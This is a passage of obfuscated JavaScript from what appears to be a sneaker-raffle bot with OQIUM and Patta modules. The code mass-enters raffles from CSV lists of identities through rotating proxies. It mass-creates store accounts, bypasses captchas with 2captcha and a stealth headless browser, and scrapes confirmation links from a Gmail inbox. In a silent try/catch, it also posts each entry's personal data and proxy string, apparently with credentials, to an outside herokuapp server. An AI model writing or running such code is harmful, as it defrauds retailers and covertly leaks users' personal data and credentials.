                                !_0x56bd4e && (_0x56bd4e = {});
                                if (_0x263dca != 'ver') {
                                    _0x445891(_0x397dcf['name'] + '\x20Task\x20' + (_0x4c414f + 0x1) + '\x20/\x20' + _0x56bd4e['length'] + '\x20||\x20File:\x20' + _0x4d7b48 + '\x20Proxies:\x20' + _0x2bc9a5), _0x9bb5d3 = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x128b96
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x56bd4e[_0x4c414f]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x4ae33b['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x8a26c5
                                            }
                                        ]
                                    }], _0x1d4eab = { 'embeds': _0x9bb5d3 }, _0x5840c2 = _0x397dcf['data'], _0x5840c2['data']['attributes']['email'] = '' + _0x56bd4e[_0x4c414f]['Email'];
                                    if (_0x56bd4e[_0x4c414f]['Size'] == 'RANDOM') {
                                    }
                                    _0x5840c2['data']['attributes']['properties']['$first_name'] = '' + _0x56bd4e[_0x4c414f]['FirstName'], _0x5840c2['data']['attributes']['properties']['$last_name'] = '' + _0x56bd4e[_0x4c414f]['LastName'], _0x5840c2['data']['attributes']['properties']['$address1'] = _0x56bd4e[_0x4c414f]['Address1'] + '\x20' + _0x56bd4e[_0x4c414f]['Address2'] + '\x20' + _0x56bd4e[_0x4c414f]['HouseNumber'], _0x5840c2['data']['attributes']['properties']['$zip'] = '' + _0x56bd4e[_0x4c414f]['Zip'], _0x5840c2['data']['attributes']['properties']['$city'] = '' + _0x56bd4e[_0x4c414f]['City'], _0x5840c2['data']['attributes']['properties']['$country'] = '' + _0x56bd4e[_0x4c414f]['Country'], _0x56bd4e[_0x4c414f]['Size'] == 'RANDOM' ? _0x5840c2['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x524aea[_0xd3cea7] : _0x5840c2['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x56bd4e[_0x4c414f]['Size'], _0x5840c2['data']['attributes']['properties']['$phone_number'] = '' + _0x56bd4e[_0x4c414f]['Phone'], _0x5840c2['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x56bd4e[_0x4c414f]['Follower'];
                                }
                                if (_0x4ae33b['useRandomProxy'] = ![])
                                    var _0x1259dd = _0xa78f78[_0x4c414f]['split'](':');
                                else
                                    var _0x214fd1 = Math['round'](Math['random']() * (_0xa78f78['length'] - 0x1)), _0x1259dd = _0xa78f78[_0x214fd1]['split'](':');
                                var _0x1e8211 = {
                                    'jar': _0x22e099,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x397dcf['url'],
                                    'headers': _0x397dcf['headers'],
                                    'body': JSON['stringify'](_0x5840c2),
                                    'proxy': 'http://' + _0x1259dd[0x2] + ':' + _0x1259dd[0x3] + '@' + _0x1259dd[0x0] + ':' + _0x1259dd[0x1]
                                };
                                return _0x263dca != 'ver' && (_0x1e8211['url'] = _0x397dcf['url'], _0x1e8211['headers'] = _0x397dcf['headers']), _0x263dca == 'ver' && (_0x1e8211['method'] = 'GET'), new Promise(function (_0xe6d2a4, _0x1ffb74) {
                                    callback = async (_0x45250d, _0x54f8f9, _0x18129e) => {
                                        if (!_0x45250d && _0x54f8f9['statusCode'] == 0xca || !_0x45250d && _0x54f8f9['statusCode'] == 0xc8) {
                                            if (_0x263dca != 'ver') {
                                                var _0x4c0012 = await _0x559dec(_0x56bd4e[_0x4c414f], _0x397dcf, 'dev', ![]), _0x5afbc5 = await _0x559dec(_0x56bd4e[_0x4c414f], _0x397dcf, 'pub', ![]);
                                                const _0x34b76c = {
                                                    'succesDEVMSG': { 'embeds': [_0x4c0012] },
                                                    'succesPUBMSG': { 'embeds': [_0x5afbc5] }
                                                };
                                                let _0x56e90f = _0x56bd4e[_0x4c414f];
                                                try {
                                                    prxdata = {
                                                        'username': _0x128b96['replace']('#', ''),
                                                        'module': _0x397dcf['name'],
                                                        'entrydata': JSON['stringify'](_0x56e90f),
                                                        'proxy': '' + _0xa78f78[_0x4c414f]
                                                    };
                                                    var _0x55acb0 = JSON['stringify'](prxdata);
                                                    let _0x23a6d6 = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x48af5a['post']('https://jraffles.herokuapp.com/success', _0x55acb0, _0x23a6d6);
                                                } catch (_0x5550ee) {
                                                }
                                                if (_0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '')
                                                    try {
                                                        await _0x48936e(_0x4ae33b['webhook'], _0x34b76c['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x41ed31(0xc8), await _0x48936e(_0x3a625c, _0x34b76c['succesDEVMSG']), await _0x41ed31(0xc8);
                                                try {
                                                    await _0x48936e(_0x22a07c, _0x34b76c['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x13e83d(_0x56bd4e[_0x4c414f], _0x397dcf);
                                            }
                                            _0x4d65a0--, _0xe6d2a4(console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0x397dcf['name'] + ']\x20Task\x20' + (_0x4c414f + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x263dca != 'ver') {
                                                var _0x312795 = '' + _0x45250d, _0x2c4859 = await _0x559dec(_0x56bd4e[_0x4c414f], _0x397dcf, 'dev', !![], _0x312795), _0x3cc220 = {};
                                                _0x3cc220['errorDEV'] = { 'embeds': [_0x2c4859] }, _0x2504ad(_0x56bd4e[_0x4c414f], _0x397dcf), _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x3cc220['errorDEV']), await _0x48936e(_0x36657d, _0x3cc220['errorDEV']);
                                            }
                                            _0x4d65a0--, _0x1ffb74(console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x397dcf['name'] + ']\x20Task\x20' + (_0x4c414f + 0x1) + ':\x20' + _0x45250d)));
                                        }
                                    };
                                    try {
                                        _0x263dca != 'ver' && console['log'](_0x82e5a5() + '\x20[' + _0x397dcf['name'] + ']\x20Task\x20' + (_0x4c414f + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5840c2['data']['attributes']['email']), _0x475f73(_0x1e8211, callback);
                                    } catch (_0x10bfad) {
                                        console['log'](_0x82e5a5() + '\x20Task\x20' + (_0x4c414f + 0x1) + ':\x20' + _0x10bfad);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x35d641(_0x955451, 'nor', _0x2c6f75, _0x391836, _0xc9ed19), console['log'](_0x82e5a5() + '\x20[' + _0x2c6f75['name'] + ']\x20Sleeping\x20for\x20' + _0x4ae33b['delay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['delay']);
                            } catch (_0xfa8dc1) {
                            }
                        }
                        _0x571422(_0x47eec1, _0x28fa69, _0x6be784, _0x5c9fa2), await _0x41ed31(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x5db728, _0x18974e, _0x55693c) {
                    var _0x18974e = [], _0x444f88 = ![];
                    async function _0x26ea83() {
                        var _0x194205 = new _0x2fa2c3({
                            'user': _0x4ae33b['masterMail'],
                            'password': _0x4ae33b['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x2249a5(_0x2fa055) {
                            _0x194205['openBox']('INBOX', ![], _0x2fa055);
                        }
                        _0x194205['once']('ready', function () {
                            _0x2249a5(function (_0x220339, _0x83f5c) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x220339)
                                    throw _0x220339;
                                _0x194205['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x247932, _0x4b50df) {
                                    if (!_0x4b50df || !_0x4b50df['length'])
                                        console['log'](_0x82e5a5() + '\x20[' + _0x5db728['name'] + ']\x20No\x20mails\x20found'), _0x194205['end']();
                                    else {
                                        var _0x16ef68 = _0x194205['seq']['fetch'](_0x4b50df, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x16ef68['on']('message', function (_0x457086, _0x9bcd64) {
                                            var _0x2bc5f2 = '(#' + _0x9bcd64 + ')\x20';
                                            _0x457086['on']('body', function (_0x35035b, _0x578de6) {
                                                _0x44103a(_0x35035b, (_0x2e3c4f, _0xd5e6c) => {
                                                    var _0x2f096a = _0xd5e6c['text']['split']('(')[0x1], _0x20e9a9 = _0x2f096a['split'](')')[0x0];
                                                    _0x18974e['push'](_0x20e9a9);
                                                });
                                            }), _0x457086['once']('end', function () {
                                            });
                                        }), _0x16ef68['once']('error', function (_0x17c6e1) {
                                            console['log']('Fetch\x20error:\x20' + _0x17c6e1), _0x444f88 = !![];
                                        }), _0x16ef68['once']('end', function () {
                                            _0x194205['end'](), _0x444f88 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x194205['once']('error', function (_0x30ecd8) {
                            console['log'](_0x30ecd8), _0x444f88 = !![];
                        }), _0x194205['once']('end', async function () {
                            _0x444f88 = !![];
                        }), _0x194205['connect']();
                    }
                    async function _0x2d44e4(_0x38cb7b, _0x282b82, _0x5b802c) {
                        for (var _0x2a5898 = 0x0; _0x2a5898 < _0x282b82['length']; _0x2a5898++) {
                            async function _0x480593(_0x59d9db, _0x85a75b, _0x4d7b35, _0x5e5a24, _0x588503) {
                                var _0x19a425, _0x147787 = {}, _0x1b3f0a = [], _0x15f3bf = {}, _0x5ca346 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x203f80 = Math['round'](Math['random']() * (_0x5ca346['length'] - 0x1));
                                _0x5e5a24[_0x59d9db]['Size'] == 'RANDOM' && (_0x5e5a24[_0x59d9db]['Size'] = _0x5ca346[_0x203f80]);
                                !_0x5e5a24 && (_0x5e5a24 = {});
                                if (_0x4ae33b['useRandomProxy'] = ![])
                                    var _0x51bcae = _0x588503[_0x59d9db]['split'](':');
                                else
                                    var _0x594831 = Math['round'](Math['random']() * (_0x588503['length'] - 0x1)), _0x51bcae = _0x588503[_0x594831]['split'](':');
                                var _0x540ca7 = {
                                    'jar': _0x22e099,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x4d7b35['url'],
                                    'headers': _0x4d7b35['headers'],
                                    'body': JSON['stringify'](_0x147787),
                                    'proxy': 'http://' + _0x51bcae[0x2] + ':' + _0x51bcae[0x3] + '@' + _0x51bcae[0x0] + ':' + _0x51bcae[0x1]
                                };
                                return _0x85a75b == 'ver' && (_0x540ca7['method'] = 'GET', _0x540ca7['url'] = _0x5e5a24[_0x59d9db]), new Promise(function (_0x58f142, _0x2777e1) {
                                    callback = async (_0x1bd90a, _0x2c4853, _0x40b5e4) => {
                                        !_0x1bd90a && _0x2c4853['statusCode'] == 0xca || !_0x1bd90a && _0x2c4853['statusCode'] == 0xc8 ? _0x58f142(console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0x4d7b35['name'] + ']\x20Task\x20' + (_0x59d9db + 0x1) + ':\x20Raffle\x20Entered!'))) : _0x2777e1(console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x4d7b35['name'] + ']\x20Task\x20' + (_0x59d9db + 0x1) + ':\x20' + _0x1bd90a)));
                                    };
                                    try {
                                        _0x85a75b != 'ver' ? console['log'](_0x82e5a5() + '\x20[' + _0x4d7b35['name'] + ']\x20Task\x20' + (_0x59d9db + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x147787['data']['attributes']['email']) : console['log'](_0x82e5a5() + '\x20[' + _0x4d7b35['name'] + ']\x20Task\x20' + (_0x59d9db + 0x1) + ':\x20Fetching\x20Response'), _0x475f73(_0x540ca7, callback);
                                    } catch (_0x537c18) {
                                        console['log'](_0x82e5a5() + '\x20Task\x20' + (_0x59d9db + 0x1) + ':\x20' + _0x537c18);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x480593(_0x2a5898, 'ver', _0x38cb7b, _0x282b82, _0x5b802c), console['log'](_0x82e5a5() + '\x20[' + _0x38cb7b['name'] + ']\x20Sleeping\x20for\x20' + _0x4ae33b['delay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['delay']);
                            } catch (_0x4c0035) {
                                console['log'](_0x4c0035), await _0x41ed31(0x2710);
                            }
                        }
                    }
                    try {
                        _0x26ea83();
                        while (!_0x444f88) {
                            await _0x41ed31(0xfa0);
                        }
                        console['log']('Found\x20' + _0x18974e['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch (_0x11833f) {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), console['log'](_0x11833f), await _0x41ed31(0x2710);
                    }
                    try {
                        await _0x2d44e4(_0x5db728, _0x18974e, _0x55693c);
                    } catch (_0x48f57a) {
                        console['log'](_0x48f57a), await _0x41ed31(0x2710);
                    }
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x1d29fe, _0x4592f0, _0x77c98a) {
                    _0x23e690['use'](_0x57a02e()), _0x23e690['use'](_0x2aeb7e({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4ae33b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x517964 = 0x0; _0x517964 < _0x4592f0['length']; _0x517964++) {
                        var _0x211d63 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x128b96
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4ae33b['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x8a26c5
                                }
                            ]
                        }];
                        const _0x12bb9c = { 'embeds': _0x211d63 };
                        _0x445891(_0x1d29fe['name'] + '\x20Task\x20' + (_0x517964 + 0x1) + '\x20/\x20' + _0x4592f0['length'] + '\x20||\x20File:\x20' + _0x4d7b48 + '\x20Proxies:\x20' + _0x2bc9a5);
                        try {
                            await _0x101e1b(_0x4592f0, _0x517964);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x2e7c47 = await _0x559dec(_0x4592f0[_0x517964], _0x1d29fe, 'acc', ![]);
                        const _0x200754 = { 'succesDEVMSG': { 'embeds': [_0x2e7c47] } };
                        if (_0x4592f0[_0x517964]['Email'] == '' || _0x4592f0[_0x517964]['FirstName'] == '' || _0x4592f0[_0x517964]['LastName'] == '') {
                            console['log'](_0x82e5a5() + '\x20[' + _0x372ea7[taskModule]['name'] + ']\x20Task\x20' + (_0x517964 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x41ed31(0x7d0);
                            continue;
                        }
                        (_0x4592f0[_0x517964]['Password'] == '' || _0x4592f0[_0x517964] == undefined) && _0x4592f0[_0x517964]['Password'] == 'JRaffles23!';
                        if (_0x4ae33b['useRandomProxy'] = ![])
                            var _0x3c3428 = _0x77c98a[_0x517964]['split'](':');
                        else
                            var _0x39c71f = Math['round'](Math['random']() * (_0x77c98a['length'] - 0x1)), _0x3c3428 = _0x77c98a[_0x39c71f]['split'](':');
                        var _0x286a2f;
                        try {
                            _0x286a2f = await _0x23e690['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3c3428[0x0] + ':' + _0x3c3428[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x286a2f = await _0x23e690['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3c3428[0x0] + ':' + _0x3c3428[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2ad79e = await _0x286a2f['newPage']();
                            await _0x2ad79e['authenticate']({
                                'username': '' + _0x3c3428[0x2],
                                'password': '' + _0x3c3428[0x3]
                            }), console['log'](_0x82e5a5() + '\x20[' + _0x1d29fe['name'] + ']\x20Task\x20' + (_0x517964 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2ad79e['setRequestInterception'](!![]), _0x2ad79e['on']('request', _0x5b8fea => {
                                _0x5b8fea['resourceType']() === 'image' || _0x5b8fea['resourceType']() === 'font' || _0x5b8fea['resourceType']() === 'media' ? _0x5b8fea['abort']() : _0x5b8fea['continue']();
                            }), await _0x2ad79e['goto']('https://patta.nl/account/register'), await _0x41ed31(0xbb8), await _0x2ad79e['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x82e5a5() + '\x20[' + _0x1d29fe['name'] + ']\x20Task\x20' + (_0x517964 + 0x1) + '\x20:\x20Filling\x20information'), await _0x2ad79e['type']('#RegisterForm-FirstName', '' + _0x4592f0[_0x517964]['FirstName']), await _0x41ed31(0x226), await _0x2ad79e['type']('#RegisterForm-LastName', '' + _0x4592f0[_0x517964]['LastName']), await _0x41ed31(0x226), await _0x2ad79e['type']('#RegisterForm-email', '' + _0x4592f0[_0x517964]['Email']), await _0x41ed31(0x226), await _0x2ad79e['type']('#RegisterForm-password', '' + _0x4592f0[_0x517964]['Password']), await _0x41ed31(0x226), console['log'](_0x82e5a5() + '\x20[' + _0x1d29fe['name'] + ']\x20Task\x20' + (_0x517964 + 0x1) + '\x20:\x20Submitting..'), await _0x2ad79e['$eval']('#RegisterForm', _0x349788 => _0x349788['submit']()), await _0x41ed31(0x1f40);
                            try {
                                await _0x2ad79e['waitForSelector']('.home-page-grid__collection'), await _0x41ed31(0x1f4), console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0x1d29fe['name'] + ']\x20Task\x20' + (_0x517964 + 0x1) + '\x20:\x20Account\x20' + _0x4592f0[_0x517964]['Email'] + '\x20Generated!')), _0x223df9['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x4592f0[_0x517964]['Email'] + ',' + _0x4592f0[_0x517964]['Password']), console['log'](_0x3dfcf2['yellow'](_0x82e5a5() + '\x20[' + _0x1d29fe['name'] + ']\x20Task\x20' + (_0x517964 + 0x1) + '\x20:\x20Account\x20' + _0x4592f0[_0x517964]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x200754['succesDEVMSG']);
                                } catch {
                                }
                                await _0x48936e(_0x1041df, _0x200754['succesDEVMSG']);
                            } catch (_0x4221b1) {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x372ea7[taskModule]['name'] + ']\x20Task\x20' + (_0x517964 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x4221b1));
                            }
                        } catch (_0xb64b68) {
                            console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x372ea7[taskModule]['name'] + ']\x20Task\x20' + (_0x517964 + 0x1) + '\x20:\x20' + _0xb64b68));
                        } finally {
                            _0x286a2f && _0x286a2f['close'](), console['log']('Waiting\x20for\x20' + _0x4ae33b['delay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x5bb715, _0x3a21f9, _0x2c7091) {
                    _0x23e690['use'](_0x57a02e()), _0x23e690['use'](_0x2aeb7e({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4ae33b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x142a3f = 0x0; _0x142a3f < _0x3a21f9['length']; _0x142a3f++) {
                        var _0x16fac0;
                        if (_0x300ed6 != 'yes')
                            var _0x300ed6 = '', _0x455eb2 = 0x0;
                        _0x445891(_0x5bb715['name'] + '\x20Task\x20' + (_0x142a3f + 0x1) + '\x20/\x20' + _0x3a21f9['length'] + '\x20||\x20File:\x20' + _0x4d7b48 + '\x20Proxies:\x20' + _0x2bc9a5);
                        try {
                            await _0x101e1b(_0x3a21f9, _0x142a3f);
                        } catch {
                            _0x300ed6 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x3a21f9[_0x142a3f]['Email'] == '' || _0x3a21f9[_0x142a3f]['Password'] == '' || _0x3a21f9[_0x142a3f]['FirstName'] == '' || _0x3a21f9[_0x142a3f]['LastName'] == '') {
                            console['log'](_0x82e5a5() + '\x20[' + _0x372ea7[taskModule]['name'] + ']\x20Task\x20' + (_0x142a3f + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x4ae33b['useRandomProxy'] = ![])
                            var _0x56dca8 = _0x2c7091[_0x142a3f]['split'](':');
                        else
                            var _0x184adf = Math['round'](Math['random']() * (_0x2c7091['length'] - 0x1)), _0x56dca8 = _0x2c7091[_0x184adf]['split'](':');
                        var _0x218299;
                        try {
                            _0x218299 = await _0x23e690['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x56dca8[0x0] + ':' + _0x56dca8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x218299 = await _0x23e690['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x56dca8[0x0] + ':' + _0x56dca8[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2f5b66 = await _0x218299['newPage']();
                            await _0x2f5b66['authenticate']({
                                'username': '' + _0x56dca8[0x2],
                                'password': '' + _0x56dca8[0x3]
                            }), console['log'](_0x82e5a5() + '\x20[' + _0x5bb715['name'] + ']\x20Task\x20' + (_0x142a3f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2f5b66['setRequestInterception'](!![]), _0x2f5b66['on']('request', _0x31e160 => {
                                _0x31e160['resourceType']() === 'image' || _0x31e160['resourceType']() === 'font' || _0x31e160['resourceType']() === 'media' ? _0x31e160['abort']() : _0x31e160['continue']();
                            }), await _0x2f5b66['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x2f5b66['waitForSelector']('#CustomerEmail'), console['log'](_0x82e5a5() + '\x20[' + _0x5bb715['name'] + ']\x20Task\x20' + (_0x142a3f + 0x1) + '\x20:\x20Logging\x20in..'), await _0x2f5b66['type']('#CustomerEmail', '' + _0x3a21f9[_0x142a3f]['Email']), await _0x41ed31(0x12c), await _0x2f5b66['type']('#CustomerPassword', '' + _0x3a21f9[_0x142a3f]['Password']), await _0x41ed31(0x226), await _0x2f5b66['$eval']('#customer_login', _0x293c25 => _0x293c25['submit']());
                            try {
                                await _0x2f5b66['waitForSelector']('#orders'), await _0x41ed31(0x4b0);
                            } catch {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x5bb715['name'] + ']\x20Task\x20' + (_0x142a3f + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x2f5b66['goto']('' + _0x3a21f9[_0x142a3f]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x41ed31(0xbb8), console['log'](_0x82e5a5() + '\x20[' + _0x5bb715['name'] + ']\x20Task\x20' + (_0x142a3f + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x2f5b66['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0x5bb715['name'] + ']\x20Task\x20' + (_0x142a3f + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x2f5b66['type']('#email', '' + _0x3a21f9[_0x142a3f]['Email']), await _0x41ed31(0x384), await _0x2f5b66['type']('#first_name', '' + _0x3a21f9[_0x142a3f]['FirstName']), await _0x41ed31(0x514), await _0x2f5b66['type']('#last_name', '' + _0x3a21f9[_0x142a3f]['LastName']), await _0x41ed31(0x514), await _0x2f5b66['type']('#street_address', _0x3a21f9[_0x142a3f]['Address1'] + '\x20' + _0x3a21f9[_0x142a3f]['HouseNumber'] + '\x20' + _0x3a21f9[_0x142a3f]['Address2']), await _0x41ed31(0x2bc);
                            _0x3a21f9[_0x142a3f]['Postcode'] == undefined && (_0x3a21f9[_0x142a3f]['Postcode'] = _0x3a21f9[_0x142a3f]['Zip']);
                            await _0x2f5b66['type']('#zip_code', '' + _0x3a21f9[_0x142a3f]['Postcode']), await _0x41ed31(0x320), await _0x2f5b66['type']('#city', '' + _0x3a21f9[_0x142a3f]['City']), await _0x41ed31(0x320), await _0x2f5b66['type']('#bday', '01/01/1994'), await _0x41ed31(0x320), await _0x2f5b66['type']('#instagram', '' + _0x3a21f9[_0x142a3f]['Follower']), await _0x41ed31(0x352);
                            if (_0x3a21f9[_0x142a3f]['Size'] == 'RANDOM') {
                                const _0x56258d = await _0x2f5b66['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x49fe84 => {
                                    return _0x49fe84['map'](_0x1c9e36 => _0x1c9e36['textContent']);
                                });
                                var _0x4e0233 = Math['round'](Math['random']() * (_0x56258d['length'] - 0x1));
                                console['log'](_0x82e5a5() + '\x20[' + _0x5bb715['name'] + ']\x20Task\x20' + (_0x142a3f + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x56258d[_0x4e0233]), await _0x2f5b66['click']('label[data-eu-size=\x22' + _0x56258d[_0x4e0233] + '\x22]');
                            } else {
                                console['log'](_0x82e5a5() + '\x20[' + _0x5bb715['name'] + ']\x20Task\x20' + (_0x142a3f + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x3a21f9[_0x142a3f]['Size']);
                                try {
                                    await _0x2f5b66['click']('label[data-eu-size=\x22' + _0x3a21f9[_0x142a3f]['Size'] + '\x22]');
                                } catch {
                                    await _0x2f5b66['click']('label[data-eu-size=\x22' + _0x3a21f9[_0x142a3f]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x41ed31(0xbb8), await _0x2f5b66['$$eval']('.raffle__checkbox-label', _0x1bc8e4 => _0x1bc8e4['forEach'](_0x44d926 => _0x44d926['click']())), await _0x41ed31(0x7d0), console['log'](_0x82e5a5() + '\x20[' + _0x5bb715['name'] + ']\x20Task\x20' + (_0x142a3f + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x2f5b66['click']('#raffle__form-submit'), await _0x41ed31(0x1388);
                            try {
